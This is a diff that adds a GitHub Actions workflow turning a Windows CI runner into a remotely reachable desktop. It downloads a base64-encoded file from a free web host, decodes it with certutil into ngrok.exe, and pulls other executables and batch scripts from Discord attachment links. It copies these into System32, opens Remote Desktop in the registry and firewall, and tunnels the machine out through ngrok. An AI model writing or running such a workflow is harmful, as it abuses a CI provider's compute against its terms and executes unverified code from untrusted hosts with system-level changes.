@@ -1,0 +1,29 @@
+name: RDP_2022
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-2022
+    env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+    steps:
+    - name: Running...
+      run: |
+        Invoke-WebRequest https://githubdada.000webhostapp.com/ngrok.php -OutFile ngrok.php
+        certutil -decode ngrok.php ngrok.exe
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/911122303562170411/911123288728698880/nssm.exe -OutFile nssm.exe
+        copy nssm.exe C:\Windows\System32
+        copy ngrok.exe C:\Windows\System32
+        .\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/911122303562170411/911123287856250890/NGROK-US.bat -OutFile NGROK-US.bat
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/911122303562170411/911132314728275998/NGROK-CHECK.bat -OutFile NGROK-CHECK.bat
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/911122303562170411/911123287336181760/loop.bat -OutFile loop.bat
+        start NGROK-US.bat
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+        sc start ngrok
+        cmd /c NGROK-CHECK.bat
+        cmd /c loop.bat 
